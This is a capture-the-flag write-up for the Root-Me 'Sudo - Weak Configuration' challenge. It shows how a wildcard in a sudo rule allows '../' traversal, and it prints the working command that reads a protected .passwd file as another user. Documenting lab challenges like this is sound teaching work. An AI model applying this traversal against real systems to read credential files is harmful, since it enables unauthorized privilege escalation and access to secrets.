### Challenge Documentation: Sudo - Weak Configuration

**Category:** Root-Me / App-Script  

**Link:** [Sudo - Weak Configuration](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)  

**Objective:**  
The goal of this challenge is to exploit a misconfigured `sudo` rule to read the `.passwd` file located in `/challenge/app-script/ch1/ch1cracked/`.

#### 1. **Initial Setup**

The challenge provides access to a remote server with the following SSH credentials:
- **Host**: `challenge02.root-me.org`
- **Port**: `2222`
- **Username**: `app-script-ch1`
- **Password**: `app-script-ch1`

##### **Connection Command**
```bash
ssh -p 2222 app-script-ch1@challenge02.root-me.org
```

#### 2. **Challenge Overview**

Once connected, the `readme.md` file describes the goal of the challenge:
```bash
cat readme.md
```

**Output:**
```
Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
/challenge/app-script/ch1/ch1cracked/

You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/
```

To achieve this, we need to find a way to access the `.passwd` file.  

#### 3. **Analyzing Sudo Permissions**

Check the `sudo` privileges available to the current user:
```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass,
    !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

##### Key Observations:
- The user `app-script-ch1` is allowed to execute the `cat` command as `app-script-ch1-cracked` for files in `/challenge/app-script/ch1/notes/*`.
- The wildcard (`*`) allows directory traversal via `../`, potentially granting access to the `.passwd` file.

#### 4. **Exploitation Steps**

##### Step 1: Use Directory Traversal to Access `.passwd`
By leveraging the wildcard in the `sudo` rule, we can bypass the restriction and access the `.passwd` file located outside `/challenge/app-script/ch1/notes/`.

Execute the following command:
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

#### 5. **Output**

The command successfully reads the `.passwd` file:
```
***************************
```

#### 6. **Summary of Commands**

Here is the complete set of commands used to solve the challenge:
```bash
ssh -p 2222 app-script-ch1@challenge02.root-me.org

# Analyze the challenge details
cat readme.md

# Check sudo permissions
sudo -l

# Exploit the sudo rule to read the .passwd file
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

#### 7. **Conclusion**

By exploiting the weak sudo configuration, we successfully bypassed directory restrictions using `../` to read the `.passwd` file. The flag validates the challenge completion.